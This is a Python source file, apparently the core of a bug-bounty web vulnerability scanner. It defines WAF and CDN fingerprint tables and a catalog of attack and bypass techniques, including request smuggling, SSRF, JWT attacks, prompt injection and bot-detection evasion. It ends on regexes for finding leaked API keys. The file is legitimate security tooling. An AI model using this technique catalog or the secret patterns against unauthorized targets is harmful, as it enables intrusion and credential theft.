"""Blackthorn threat-hunting and bug-bounty web security scanner.

The engine combines endpoint discovery, vulnerability-specific probes,
configuration auditing, reconnaissance, and proof-carrying result reporting.
"""
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import (
    urlparse, urlencode, quote, quote_plus, parse_qsl, urlsplit, urlunsplit,
    urljoin,
)
import time
import hashlib
import logging
import difflib
import random
import socket
import ssl
import json
import os
import re
import builtins
import sys
from typing import Optional, List, Dict, Any, Tuple, Set
from functools import lru_cache
import threading

# Suppress InsecureRequestWarning for unverified HTTPS requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from .exceptions import (
    BaselineFailedError,
    InvalidTargetError,
    InvalidSchemeError,
    TargetUnreachableError,
    ScanInterruptedError,
    InvalidThreadCountError,
    InvalidDelayError,
    InvalidTimeoutError,
)
from .error_handler import (
    validate_url,
    GracefulErrorHandler,
    retry_on_network_error,
)
from .repro import build_curl
from .techniques_v16 import ExtraTechniques
from .evidence import analyze_response, public_response, snapshot_response


logger = logging.getLogger(__name__)


_REAL_STDOUT = None


def _quiet_stdout() -> None:
    """Swallow human-readable progress output (pipeline/--json mode).

    The original stdout is preserved so the final JSON can be written to it
    cleanly. Logging is unaffected (it targets stderr / the log file).
    """
    global _REAL_STDOUT
    import io
    if _REAL_STDOUT is None:
        _REAL_STDOUT = sys.stdout
    sys.stdout = io.StringIO()


def _emit_json_stdout(results) -> None:
    """Write results as JSON to the real stdout (restoring it if quieted)."""
    out = _REAL_STDOUT or sys.stdout
    try:
        sys.stdout = out
    except Exception:
        pass
    try:
        out.write(json.dumps(_json_safe_value(results), indent=2))
        out.write('\n')
        out.flush()
    except Exception:
        builtins.print('[]')


def _json_safe_value(value, *, _seen=None, _depth=0):
    """Return a bounded JSON-safe copy of scanner/plugin output.

    User plugins historically returned live ``requests.Response`` objects. A
    streaming ``json.dump`` would write everything before that object and then
    fail, leaving the GUI with a truncated results file at 98% progress. Keep
    response evidence, but never serialize arbitrary live Python objects.
    """
    if value is None or isinstance(value, (str, int, float, bool)):
        return value
    if isinstance(value, bytes):
        return value[:50000].decode('utf-8', errors='replace')
    if _depth >= 20:
        return '[maximum nesting omitted]'

    if _seen is None:
        _seen = set()
    identity = id(value)
    if identity in _seen:
        return '[recursive value omitted]'

    if isinstance(value, dict):
        _seen.add(identity)
        try:
            return {
                str(key): _json_safe_value(item, _seen=_seen, _depth=_depth + 1)
                for key, item in value.items()
            }
        finally:
            _seen.discard(identity)
    if isinstance(value, (list, tuple, set, frozenset)):
        _seen.add(identity)
        try:
            return [
                _json_safe_value(item, _seen=_seen, _depth=_depth + 1)
                for item in value
            ]
        finally:
            _seen.discard(identity)

    # Preserve useful HTTP evidence from requests/curl_cffi response objects.
    if hasattr(value, 'status_code') and hasattr(value, 'headers'):
        try:
            return public_response(snapshot_response(value, _normalize_body))
        except Exception:
            return {
                'status': int(getattr(value, 'status_code', 0) or 0),
                'size': 0, 'content_type': '', 'headers': {}, 'excerpt': '',
            }

    isoformat = getattr(value, 'isoformat', None)
    if callable(isoformat):
        try:
            return isoformat()
        except Exception:
            pass
    return f'[unsupported {type(value).__name__} omitted]'


def _write_json_atomic(path: str, results) -> None:
    """Serialize completely, then replace the destination in one operation."""
    safe_results = _json_safe_value(results)
    tmp_path = f'{path}.writing-{os.getpid()}-{threading.get_ident()}'
    try:
        with open(tmp_path, 'w', encoding='utf-8') as handle:
            json.dump(safe_results, handle, indent=2, ensure_ascii=False)
            handle.flush()
            os.fsync(handle.fileno())
        os.replace(tmp_path, path)
    finally:
        try:
            if os.path.exists(tmp_path):
                os.unlink(tmp_path)
        except OSError:
            pass


def _configure_console_output() -> None:
    """Best-effort console setup to avoid Unicode crashes on legacy Windows code pages."""
    for stream_name in ('stdout', 'stderr'):
        stream = getattr(sys, stream_name, None)
        if stream is None:
            continue
        try:
            # Keep current encoding if possible, but force safe replacement behavior.
            stream.reconfigure(errors='replace')
        except Exception:
            pass


def _safe_print(*args, **kwargs):
    """Print with fallback replacement when terminal encoding cannot represent Unicode."""
    try:
        builtins.print(*args, **kwargs)
        return
    except UnicodeEncodeError:
        pass

    sep = kwargs.get('sep', ' ')
    end = kwargs.get('end', '\n')
    target_file = kwargs.get('file', sys.stdout)
    flush = kwargs.get('flush', False)

    try:
        text = sep.join(str(a) for a in args)
    except Exception:
        text = ' '.join(str(a) for a in args)

    encoding = getattr(target_file, 'encoding', None) or 'utf-8'
    safe_text = text.encode(encoding, errors='replace').decode(encoding, errors='replace')
    builtins.print(safe_text, end=end, file=target_file, flush=flush)


_configure_console_output()
print = _safe_print


# WAF Signature Database
WAF_SIGNATURES = {
    'cloudflare': {
        'headers': ['cf-ray', 'cf-cache-status', 'cf-request-id', '__cfduid'],
        'cookies': ['__cfduid', '__cf_bm'],
        'server': ['cloudflare'],
        'body_patterns': ['cloudflare', 'cf-ray', 'attention required', 'cloudflare ray id'],
    },
    'aws_waf': {
        'headers': ['x-amzn-requestid', 'x-amz-cf-id', 'x-amz-cf-pop'],
        'cookies': ['awsalb', 'awsalbcors'],
        'server': ['awselb', 'amazon', 'cloudfront'],
        'body_patterns': ['aws', 'x-amz-', 'request blocked'],
    },
    'akamai': {
        'headers': ['akamai-origin-hop', 'x-akamai-transformed', 'x-akamai-request-id'],
        'cookies': ['akamai_', 'ak_bmsc', 'bm_sv', 'bm_sz'],
        'server': ['akamaighost', 'akamai'],
        'body_patterns': ['akamai', 'access denied', 'reference #'],
    },
    'imperva': {
        'headers': ['x-iinfo', 'x-cdn'],
        'cookies': ['incap_ses_', 'nlbi_', 'visid_incap_'],
        'server': ['imperva', 'incapsula'],
        'body_patterns': ['imperva', 'incapsula', 'incident id', '_incap_'],
    },
    'f5_bigip': {
        'headers': ['x-wa-info'],
        'cookies': ['ts', 'bigipserver', 'f5_cspm', 'f5_st', 'f5avraaaaaaa'],
        'server': ['bigip', 'f5'],
        'body_patterns': ['the requested url was rejected', 'f5 networks', 'bigip'],
    },
    'sucuri': {
        'headers': ['x-sucuri-id', 'x-sucuri-cache'],
        'cookies': ['sucuri_'],
        'server': ['sucuri', 'cloudproxy'],
        'body_patterns': ['sucuri', 'cloudproxy', 'access denied'],
    },
    'modsecurity': {
        'headers': ['x-modsecurity-id'],
        'cookies': [],
        'server': ['modsecurity', 'mod_security'],
        'body_patterns': ['modsecurity', 'mod_security', 'rule id', 'not acceptable'],
    },
    'barracuda': {
        'headers': ['barra_counter_session'],
        'cookies': ['barra_counter_session', 'barracuda_'],
        'server': ['barracuda'],
        'body_patterns': ['barracuda', 'you have been blocked'],
    },
    'fortinet': {
        'headers': ['fortigate', 'fortiwadb'],
        'cookies': ['fgwa', 'fgtauthredirect'],
        'server': ['fortigate', 'fortinet', 'fortiweb'],
        'body_patterns': ['fortinet', 'fortigate', 'web page blocked'],
    },
    'citrix_netscaler': {
        'headers': ['cneonction', 'ns_af'],
        'cookies': ['ns_af', 'citrix_ns_id', 'nsc_'],
        'server': ['netscaler'],
        'body_patterns': ['netscaler', 'citrix', 'ns_af'],
    },
    'radware': {
        'headers': ['x-sl-compstate'],
        'cookies': [],
        'server': ['radware', 'appwall'],
        'body_patterns': ['radware', 'unauthorized activity', 'appwall'],
    },
    'wordfence': {
        'headers': [],
        'cookies': ['wfvt_', 'wordfence_'],
        'server': [],
        'body_patterns': ['wordfence', 'your access to this site has been limited', 'generated by wordfence'],
    },
    'ddos_guard': {
        'headers': ['x-ddos-protection'],
        'cookies': ['__ddg', '__ddgid', '__ddgmark'],
        'server': ['ddos-guard'],
        'body_patterns': ['ddos-guard', 'ddos protection', 'ddos guard'],
    },
    'stackpath': {
        'headers': ['x-sp-waf-nonce', 'x-sp-origin-id'],
        'cookies': [],
        'server': ['stackpath', 'maxcdn'],
        'body_patterns': ['stackpath', 'highwinds', 'maxcdn'],
    },
    'aws_shield': {
        'headers': ['x-amz-cf-id'],
        'cookies': [],
        'server': ['amazon'],
        'body_patterns': ['aws shield', 'request blocked'],
    },
    'azure_front_door': {
        'headers': ['x-azure-ref', 'x-fd-revip'],
        'cookies': [],
        'server': ['azure'],
        'body_patterns': ['azure', 'microsoft', 'access denied'],
    },
    'google_cloud_armor': {
        'headers': ['x-goog-', 'x-cloud-trace-context'],
        'cookies': [],
        'server': ['gws', 'google'],
        'body_patterns': ['google cloud', 'cloud armor', 'denied by security policy'],
    },
    'reblaze': {
        'headers': ['x-rb-', 'rbzid'],
        'cookies': ['rbzid', 'rbz'],
        'server': ['reblaze'],
        'body_patterns': ['reblaze', 'access denied', 'we apologize'],
    },
    'paloalto': {
        'headers': ['x-pan-'],
        'cookies': [],
        'server': ['palo alto'],
        'body_patterns': ['palo alto', 'url filtering', 'block page'],
    },
    'sqreen': {
        'headers': ['x-sqreen-request-id', 'x-sqreen-transaction'],
        'cookies': ['sq_'],
        'server': ['sqreen'],
        'body_patterns': ['sqreen', 'security monitoring', 'blocked by sqreen'],
    },
    'aws_appsync': {
        'headers': ['x-amzn-appsync-', 'x-aws-appsync'],
        'cookies': [],
        'server': ['appsync'],
        'body_patterns': ['appsync', 'graphql', 'x-amzn-requestid'],
    },
    'alibaba_waf': {
        'headers': ['ali-cdn-real-ip', 'x-alicdn-da-ups-status', 'via'],
        'cookies': ['aliyungf_tc', 'acw_tc', '__jsluid'],
        'server': ['aliyun', 'alibaba', 'tengine'],
        'body_patterns': ['aliyun', 'alibaba cloud', 'errors.aliyun', 'blocked by alibaba'],
    },
    'tencent_waf': {
        'headers': ['x-tencent-', 'x-cdn-', 'x-nws-log-uuid'],
        'cookies': ['tencent_', 'qcloud_'],
        'server': ['tencent', 'qcloud', 'cdn-'],
        'body_patterns': ['tencent', 'qcloud', 'blocked by waf', 'cdn.dnsv1.com'],
    },
}

# JavaScript-based WAF/Bot Detection Signatures
JAVASCRIPT_WAF_SIGNATURES = {
    'perimeterx': {
        'script_patterns': ['_px', 'PX', 'perimeterx', 'px-cdn', 'px.js', '/api/v2/collector'],
        'cookies': ['_px', '_pxvid', '_pxhd', '_pxff_', '_px3', '_pxde'],
        'body_patterns': ['perimeterx', 'human challenge', 'px-captcha', 'px-block'],
        'headers': ['x-px-'],
    },
    'datadome': {
        'script_patterns': ['datadome', 'dd.js', '/js/tags.js', 'ddjskey'],
        'cookies': ['datadome', 'datadome-_'],
        'body_patterns': ['datadome', 'dd-verify', 'robot or unusual traffic'],
        'headers': ['x-datadome', 'x-dd-'],
    },
    'human_security': {
        'script_patterns': ['px-client', 'human.js', '/px/client', '_human_'],
        'cookies': ['__cf_bm', '_human', '__h_'],
        'body_patterns': ['human security', 'bot detection', 'automated access'],
        'headers': ['x-human-'],
    },
    'kasada': {
        'script_patterns': ['kasada', '/149e9513-01fa-4fb0-aad4-566afd'],
        'cookies': ['x-kpsdk', 'kpsdk', '_kp_'],
        'body_patterns': ['kasada', 'bot protection'],
        'headers': ['x-kpsdk-'],
    },
    'shape_security': {
        'script_patterns': ['shape', '/api/p.js', 'shape-security'],
        'cookies': ['_abck', 'bm_', 'ak_bmsc'],
        'body_patterns': ['shape security', 'f5 shape'],
        'headers': ['x-shape-'],
    },
    'distil': {
        'script_patterns': ['distil', 'd-', 'distilidentifier'],
        'cookies': ['D_', 'distilidentifier', 'd_'],
        'body_patterns': ['distil', 'distil networks', 'imperva'],
        'headers': ['x-distil-'],
    },
}

# OWASP CRS Version Signatures
OWASP_CRS_SIGNATURES = {
    'crs_3.3': {
        'patterns': ['CRS3.3', 'ModSecurity Core Rule Set 3.3', 'sec-rule-id-9'],
        'rule_ids': [920, 930, 940, 941, 942, 943, 944],
    },
    'crs_3.2': {
        'patterns': ['CRS3.2', 'ModSecurity Core Rule Set 3.2'],
        'rule_ids': [920, 930, 940, 941, 942, 943],
    },
    'crs_3.1': {
        'patterns': ['CRS3.1', 'ModSecurity Core Rule Set 3.1'],
        'rule_ids': [920, 930, 940, 941, 942],
    },
    'crs_3.0': {
        'patterns': ['CRS3.0', 'ModSecurity Core Rule Set 3.0'],
        'rule_ids': [920, 930, 940, 941],
    },
    'crs_2.x': {
        'patterns': ['CRS2', 'ModSecurity Core Rule Set 2', 'modsec2'],
        'rule_ids': [950, 960, 970, 981],
    },
}

# Technology Stack Signatures
TECHNOLOGY_SIGNATURES = {
    'frameworks': {
        'django': {'headers': ['x-frame-options'], 'cookies': ['csrftoken', 'sessionid'], 'patterns': ['django', 'csrfmiddlewaretoken']},
        'flask': {'headers': [], 'cookies': ['session'], 'patterns': ['werkzeug', 'flask']},
        'rails': {'headers': ['x-runtime', 'x-request-id'], 'cookies': ['_session_id'], 'patterns': ['rails', 'ruby']},
        'laravel': {'headers': [], 'cookies': ['laravel_session', 'XSRF-TOKEN'], 'patterns': ['laravel', 'blade']},
        'express': {'headers': ['x-powered-by'], 'cookies': ['connect.sid'], 'patterns': ['express']},
        'spring': {'headers': ['x-application-context'], 'cookies': ['JSESSIONID'], 'patterns': ['spring', 'java']},
        'aspnet': {'headers': ['x-aspnet-version', 'x-aspnetmvc-version'], 'cookies': ['.aspnet', 'asp.net_sessionid'], 'patterns': ['asp.net', '__viewstate', '__eventvalidation']},
        'nextjs': {'headers': ['x-nextjs-'], 'cookies': ['__next'], 'patterns': ['_next/', 'next.js']},
        'nuxt': {'headers': [], 'cookies': [], 'patterns': ['nuxt', '_nuxt/']},
    },
    'cms': {
        'wordpress': {'patterns': ['wp-content', 'wp-admin', 'wp-includes', 'wordpress'], 'cookies': ['wordpress_', 'wp-']},
        'drupal': {'patterns': ['drupal', '/sites/default/', 'node/'], 'cookies': ['SSESS', 'Drupal']},
        'joomla': {'patterns': ['joomla', '/administrator/', '/components/'], 'cookies': ['joomla']},
        'magento': {'patterns': ['magento', '/mage/', 'varien'], 'cookies': ['PHPSESSID', 'frontend']},
        'shopify': {'patterns': ['shopify', 'cdn.shopify.com'], 'cookies': ['_shopify']},
    },
    'servers': {
        'nginx': {'patterns': ['nginx']},
        'apache': {'patterns': ['apache', 'httpd']},
        'iis': {'patterns': ['iis', 'microsoft']},
        'tomcat': {'patterns': ['tomcat', 'apache-coyote']},
        'gunicorn': {'patterns': ['gunicorn']},
        'uvicorn': {'patterns': ['uvicorn']},
    },
    'languages': {
        'php': {'headers': ['x-powered-by'], 'patterns': ['php/', '.php', 'phpsessid']},
        'python': {'patterns': ['python', 'wsgi', 'gunicorn', 'uvicorn']},
        'java': {'patterns': ['java', 'jsessionid', 'servlet']},
        'ruby': {'patterns': ['ruby', 'rails', 'rack']},
        'nodejs': {'patterns': ['node', 'express', 'x-powered-by: express']},
        'dotnet': {'patterns': ['.net', 'asp.net', 'x-aspnet']},
    },
}

# Operating System Detection Signatures
OS_SIGNATURES = {
    'linux': {
        'server_patterns': ['ubuntu', 'debian', 'centos', 'fedora', 'red hat', 'rhel', 'alpine', 'arch'],
        'header_patterns': ['unix', 'linux'],
        'path_indicators': ['/etc/', '/var/', '/usr/', '/home/', '/bin/', '/opt/'],
        'error_patterns': ['errno', 'permission denied', '/proc/', 'bash:', 'sh:'],
        'framework_indicators': ['nginx', 'apache/2', 'gunicorn', 'uwsgi', 'mod_wsgi'],
    },
    'windows': {
        'server_patterns': ['microsoft', 'windows', 'iis/', 'win32', 'win64', 'asp.net'],
        'header_patterns': ['windows', 'microsoft', 'iis', 'asp.net'],
        'path_indicators': ['c:\\', 'd:\\', 'c:/', 'd:/', 'windows\\', 'program files', 'inetpub'],
        'error_patterns': ['win32', 'aspnet', 'iis', '.dll', 'system32', 'cmd.exe', 'powershell'],
        'framework_indicators': ['iis/', 'asp.net', 'x-aspnet', 'microsoft-iis'],
    },
}

# Technique to OS Compatibility Mapping
# 'all' means works on all systems, 'linux' means Linux/Unix only, 'windows' means Windows only
TECHNIQUE_OS_COMPATIBILITY = {
    # Header Manipulation - works on all systems
    '_test_host_header_injection': 'all',
    '_test_x_forwarded_for': 'all',
    '_test_x_forwarded_host': 'all',
    '_test_x_original_url': 'all',
    '_test_header_injection': 'all',
    '_test_origin_header_bypass': 'all',
    '_test_custom_header_fuzzing': 'all',
    '_test_ip_spoofing_headers': 'all',
    '_test_host_header_attacks': 'all',
    
    # Encoding & Obfuscation - works on all systems
    '_test_encoding_bypass': 'all',
    '_test_double_encoding': 'all',
    '_test_case_manipulation': 'all',
    '_test_comment_injection': 'all',
    '_test_whitespace_manipulation': 'all',
    '_test_unicode_normalization': 'all',
    '_test_payload_mutation': 'all',
    '_test_polyglot_payloads': 'all',
    '_test_path_normalization_extended': 'all',
    
    # Protocol-Level - works on all systems
    '_test_method_bypass': 'all',
    '_test_http_method_override': 'all',
    '_test_content_type_bypass': 'all',
    '_test_http_parameter_pollution': 'all',
    '_test_transfer_encoding_smuggling': 'all',
    '_test_http2_downgrade': 'all',
    '_test_http2_specific_attacks': 'all',
    '_test_websocket_upgrade': 'all',
    '_test_websocket_security': 'all',
    '_test_chunked_transfer': 'all',
    '_test_http_pipelining': 'all',
    '_test_request_smuggling_v2': 'all',
    '_test_http_desync': 'all',
    '_test_verb_tampering_extended': 'all',
    '_test_multipart_bypass': 'all',
    
    # Cache & Control - works on all systems
    '_test_cache_control': 'all',
    '_test_range_header': 'all',
    '_test_cache_poisoning': 'all',
    '_test_web_cache_deception': 'all',
    '_test_range_header_attacks': 'all',
    
    # Injection Testing - OS-specific payloads
    '_test_sqli_bypass': 'all',  # SQL injection is database-level, not OS
    '_test_xss_bypass': 'all',  # XSS is browser/client-side
    '_test_command_injection_bypass': 'linux',  # Uses Linux commands (ls, cat, etc.)
    '_test_command_injection_windows': 'windows',  # Uses Windows commands (dir, type, etc.)
    '_test_path_traversal_bypass': 'all',  # Has separate Linux/Windows payloads
    '_test_nosql_injection': 'all',
    '_test_ldap_injection': 'all',
    '_test_ssti_detection': 'all',
    '_test_xxe_detection': 'all',
    '_test_crlf_injection': 'all',
    '_test_prototype_pollution': 'all',
    '_test_json_injection': 'all',
    '_test_deserialization': 'all',
    '_test_ssi_injection': 'linux',  # SSI mainly on Apache/Linux
    '_test_log4shell_patterns': 'all',  # Java-based, OS independent
    '_test_dangling_markup': 'all',
    '_test_css_injection': 'all',
    '_test_xslt_injection': 'all',
    
    # Security Misconfigurations - works on all systems
    '_test_cors_misconfiguration': 'all',
    '_test_open_redirect': 'all',
    '_test_security_headers': 'all',
    '_test_cookie_security': 'all',
    '_test_clickjacking': 'all',
    '_test_content_sniffing': 'all',
    '_test_response_splitting': 'all',
    
    # Business Logic - works on all systems
    '_test_api_versioning_bypass': 'all',
    '_test_mass_assignment': 'all',
    '_test_idor_detection': 'all',
    '_test_business_logic_flaws': 'all',
    '_test_email_header_injection': 'all',
    '_test_file_upload_bypass': 'all',
    '_test_rate_limit_detection': 'all',
    '_test_race_condition': 'all',
    
    # JWT & Auth - works on all systems
    '_test_jwt_oauth_bypass': 'all',
    '_test_jwt_attacks': 'all',
    
    # GraphQL - works on all systems
    '_test_graphql_bypass': 'all',
    '_test_graphql_deep_testing': 'all',
    
    # SSRF - works on all systems but metadata endpoints may differ
    '_test_ssrf_bypass': 'all',
    '_test_ssrf_protocol_smuggling': 'all',
    '_test_dns_rebinding': 'all',
    
    # PDF/Document - works on all systems
    '_test_pdf_injection': 'all',
    '_test_postmessage_vulnerabilities': 'all',
    '_test_rpo_attack': 'all',
    
    # Cloud Security - works on all systems (cloud-agnostic)
    '_test_azure_blob_enumeration': 'all',
    '_test_gcp_bucket_discovery': 'all',
    '_test_serverless_functions': 'all',
    '_test_kubernetes_api': 'all',
    '_test_cloud_provider_detection': 'all',
    '_test_cloud_metadata_enumeration': 'all',
    
    # Advanced Payloads - mixed
    '_test_time_based_detection': 'all',
    '_test_buffer_limits': 'all',
    '_test_integer_overflow': 'all',
    '_test_bot_detection_evasion': 'all',
    '_test_ipv6_bypass': 'all',
    
    # Info Disclosure - works on all systems
    '_test_information_disclosure': 'all',
    '_test_subdomain_takeover': 'all',
    '_test_api_key_exposure': 'all',
    '_test_timing_based_discovery': 'all',
    '_test_error_based_disclosure': 'all',
    
    # Detection & Recon - works on all systems
    '_detect_waf_rule_version': 'all',
    '_detect_javascript_waf': 'all',
    '_test_api_endpoint_discovery': 'all',
    '_test_dns_zone_transfer': 'all',
    '_enumerate_subdomains': 'all',
    '_historical_dns_lookup': 'all',
    '_certificate_transparency_lookup': 'all',
    '_fingerprint_technology_stack': 'all',
}

# ==================== SCAN CATEGORIES ====================
# Organized categories for GUI selection
SCAN_CATEGORIES = {
    'header_manipulation': {
        'name': 'Header Manipulation',
        'description': 'Tests for header-based bypass techniques including Host header injection, X-Forwarded-For spoofing, and custom header fuzzing.',
        'techniques': [
            '_test_host_header_injection',
            '_test_x_forwarded_for',
            '_test_x_forwarded_host',
            '_test_x_original_url',
            '_test_header_injection',
            '_test_origin_header_bypass',
            '_test_custom_header_fuzzing',
            '_test_ip_spoofing_headers',
            '_test_host_header_attacks',
        ]
    },
    'encoding_obfuscation': {
        'name': 'Encoding & Obfuscation',
        'description': 'Tests parser and normalization differences using double encoding, Unicode, case variation, and comment boundaries.',
        'techniques': [
            '_test_encoding_bypass',
            '_test_double_encoding',
            '_test_case_manipulation',
            '_test_comment_injection',
            '_test_whitespace_manipulation',
            '_test_unicode_normalization',
            '_test_payload_mutation',
            '_test_polyglot_payloads',
            '_test_path_normalization_extended',
        ]
    },
    'protocol_level': {
        'name': 'Protocol-Level Attacks',
        'description': 'Tests for protocol-level vulnerabilities including HTTP/2 attacks, WebSocket security, request smuggling, and chunked transfer.',
        'techniques': [
            '_test_method_bypass',
            '_test_http_method_override',
            '_test_content_type_bypass',
            '_test_http_parameter_pollution',
            '_test_transfer_encoding_smuggling',
            '_test_http2_downgrade',
            '_test_http2_specific_attacks',
            '_test_websocket_upgrade',
            '_test_websocket_security',
            '_test_chunked_transfer',
            '_test_http_pipelining',
            '_test_request_smuggling_v2',
            '_test_http_desync',
            '_test_verb_tampering_extended',
            '_test_multipart_bypass',
            '_test_websocket_fuzzing',
            '_test_smuggling_cl0',
            '_test_grpc_detection',
            '_test_http3_detection',
        ]
    },
    'cache_control': {
        'name': 'Cache & Control',
        'description': 'Tests for cache-based attacks including cache poisoning, cache control bypass, and web cache deception.',
        'techniques': [
            '_test_cache_control',
            '_test_range_header',
            '_test_cache_poisoning',
            '_test_web_cache_deception',
            '_test_range_header_attacks',
            '_test_cache_poisoning_deep',
        ]
    },
    'injection_testing': {
        'name': 'Injection Testing',
        'description': 'Tests for various injection vulnerabilities including SQL, XSS, command injection, SSTI, XXE, and more.',
        'techniques': [
            '_test_sqli_bypass',
            '_test_xss_bypass',
            '_test_command_injection_bypass',
            '_test_command_injection_windows',
            '_test_path_traversal_bypass',
            '_test_nosql_injection',
            '_test_ldap_injection',
            '_test_ssti_detection',
            '_test_xxe_detection',
            '_test_crlf_injection',
            '_test_prototype_pollution',
            '_test_json_injection',
            '_test_deserialization',
            '_test_ssi_injection',
            '_test_log4shell_patterns',
            '_test_dangling_markup',
            '_test_css_injection',
            '_test_xslt_injection',
            '_test_json_sqli_bypass',
            '_test_dom_xss',
            '_test_client_side_path_traversal',
            '_test_mutation_fuzzing',
        ]
    },
    'security_misconfig': {
        'name': 'Security Misconfigurations',
        'description': 'Tests for security misconfigurations including CORS, security headers, cookie security, and clickjacking.',
        'techniques': [
            '_test_cors_misconfiguration',
            '_test_open_redirect',
            '_test_security_headers',
            '_test_cookie_security',
            '_test_clickjacking',
            '_test_content_sniffing',
            '_test_response_splitting',
            '_test_csp_analysis',
        ]
    },
    'business_logic': {
        'name': 'Business Logic & Authorization',
        'description': 'Tests for business logic flaws including IDOR, mass assignment, API versioning bypass, and authorization issues.',
        'techniques': [
            '_test_api_versioning_bypass',
            '_test_mass_assignment',
            '_test_idor_detection',
            '_test_business_logic_flaws',
            '_test_email_header_injection',
            '_test_file_upload_bypass',
            '_test_rate_limit_detection',
            '_test_race_condition',
        ]
    },
    'jwt_auth': {
        'name': 'JWT & Authentication Attacks',
        'description': 'Tests for JWT vulnerabilities and authentication bypass techniques.',
        'techniques': [
            '_test_jwt_oauth_bypass',
            '_test_jwt_attacks',
            '_test_oauth_oidc',
            '_test_jwt_jwk_injection',
            '_test_saml_xsw',
            '_test_auth_logic',
        ]
    },
    'graphql_attacks': {
        'name': 'GraphQL Attacks',
        'description': 'Tests for GraphQL-specific vulnerabilities including introspection, batching attacks, and injection.',
        'techniques': [
            '_test_graphql_bypass',
            '_test_graphql_deep_testing',
            '_test_graphql_csrf',
        ]
    },
    'ai_attacks': {
        'name': 'AI / LLM Attacks',
        'description': 'Detects AI/LLM-backed endpoints and probes for prompt injection and system-prompt leakage.',
        'techniques': [
            '_test_llm_prompt_injection',
        ]
    },
    'ssrf_advanced': {
        'name': 'SSRF Advanced',
        'description': 'Tests for Server-Side Request Forgery including protocol smuggling and DNS rebinding.',
        'techniques': [
            '_test_ssrf_bypass',
            '_test_ssrf_protocol_smuggling',
            '_test_dns_rebinding',
        ]
    },
    'pdf_document': {
        'name': 'PDF/Document Attacks',
        'description': 'Tests for PDF and document-based attack vectors.',
        'techniques': [
            '_test_pdf_injection',
            '_test_postmessage_vulnerabilities',
            '_test_rpo_attack',
        ]
    },
    'cloud_security': {
        'name': 'Cloud Security',
        'description': 'Tests for cloud-specific vulnerabilities including S3, Azure Blob, GCP bucket enumeration, and serverless functions.',
        'techniques': [
            '_test_azure_blob_enumeration',
            '_test_gcp_bucket_discovery',
            '_test_serverless_functions',
            '_test_kubernetes_api',
            '_test_cloud_provider_detection',
            '_test_cloud_metadata_enumeration',
            '_test_cloud_metadata_v2',
            '_test_s3_bucket_enum',
        ]
    },
    'advanced_payloads': {
        'name': 'Advanced Payloads',
        'description': 'Advanced attack payloads including time-based detection, buffer limits, and integer overflow.',
        'techniques': [
            '_test_time_based_detection',
            '_test_buffer_limits',
            '_test_integer_overflow',
            '_test_bot_detection_evasion',
            '_test_ipv6_bypass',
            '_test_charset_confusion',
            '_test_single_packet_race',
        ]
    },
    'info_disclosure': {
        'name': 'Information Disclosure',
        'description': 'Tests for information disclosure including API key exposure, error-based disclosure, and timing-based discovery.',
        'techniques': [
            '_test_information_disclosure',
            '_test_subdomain_takeover',
            '_test_api_key_exposure',
            '_test_timing_based_discovery',
            '_test_error_based_disclosure',
            '_test_js_secret_exposure',
        ]
    },
    'detection_recon': {
        'name': 'Detection & Reconnaissance',
        'description': 'WAF detection, fingerprinting, and reconnaissance including subdomain enumeration and DNS lookups.',
        'techniques': [
            '_detect_waf_rule_version',
            '_detect_javascript_waf',
            '_test_api_endpoint_discovery',
            '_test_dns_zone_transfer',
            '_enumerate_subdomains',
            '_historical_dns_lookup',
            '_certificate_transparency_lookup',
            '_fingerprint_technology_stack',
            '_test_cve_fingerprint',
            '_test_content_discovery',
        ]
    },
}

# CDN Signatures
CDN_SIGNATURES = {
    'cloudflare': {
        'headers': ['cf-ray', 'cf-cache-status'],
        'server': ['cloudflare'],
        'cnames': ['cloudflare.com', 'cloudflare-dns.com'],
    },
    'akamai': {
        'headers': ['x-akamai-transformed'],
        'server': ['akamaighost'],
        'cnames': ['akamai.net', 'akamaiedge.net', 'akamaized.net'],
    },
    'cloudfront': {
        'headers': ['x-amz-cf-id', 'x-amz-cf-pop'],
        'server': ['amazon', 'cloudfront'],
        'cnames': ['cloudfront.net', 'amazonaws.com'],
    },
    'fastly': {
        'headers': ['x-served-by', 'x-fastly-request-id'],
        'server': ['fastly'],
        'cnames': ['fastly.net', 'fastlylb.net'],
    },
    'maxcdn': {
        'headers': ['x-maxcdn'],
        'server': ['netdna', 'maxcdn'],
        'cnames': ['netdna.com', 'maxcdn.com'],
    },
    'keycdn': {
        'headers': ['x-pull'],
        'server': ['keycdn'],
        'cnames': ['keycdn.com', 'kxcdn.com'],
    },
    'stackpath': {
        'headers': ['x-sp-origin-id'],
        'server': ['stackpath'],
        'cnames': ['stackpath.com', 'stackpathdns.com'],
    },
    'incapsula': {
        'headers': ['x-iinfo'],
        'server': ['incapsula'],
        'cnames': ['incapdns.net', 'impervadns.net'],
    },
    'sucuri': {
        'headers': ['x-sucuri-id'],
        'server': ['sucuri'],
        'cnames': ['sucuri.net'],
    },
    'azure_cdn': {
        'headers': ['x-azure-ref'],
        'server': ['azure'],
        'cnames': ['azureedge.net', 'azure.net'],
    },
    'google_cdn': {
        'headers': ['x-goog-'],
        'server': ['google', 'gws'],
        'cnames': ['googleusercontent.com', 'googlevideo.com'],
    },
    'bunnycdn': {
        'headers': ['bunny-server-header'],
        'server': ['bunny'],
        'cnames': ['bunny.net', 'b-cdn.net'],
    },
}

# Pre-compile regex patterns for performance
ERROR_PATTERNS = re.compile(
    r'(exception|traceback|stack\s*trace|sql\s*syntax|mysql_|postgresql|ora-\d+|'
    r'internal\s*server\s*error|500\s*internal|debug\s*mode|fatal\s*error|warning:)',
    re.IGNORECASE
)

BACKEND_PATTERNS = re.compile(
    r'(apache|nginx|iis|tomcat|jetty|gunicorn|uwsgi)',
    re.IGNORECASE
)

# Optional HTTP/2 client (httpx). Used for the single-packet race attack and any
# test that needs true HTTP/2 multiplexing. Degrades gracefully when unavailable.
try:
    import httpx  # type: ignore
    _HTTPX_AVAILABLE = True
except Exception:  # pragma: no cover - optional dependency
    httpx = None
    _HTTPX_AVAILABLE = False

# Secret/API-key regexes reused for scanning JavaScript bundles.
JS_SECRET_PATTERNS = {
    'AWS Access Key': r'AKIA[0-9A-Z]{16}',
    'GitHub Token': r'ghp_[0-9a-zA-Z]{36}',
    'Google API Key': r'AIza[0-9A-Za-z\-_]{35}',
    'Stripe Live': r'sk_live_[0-9a-zA-Z]{24}',
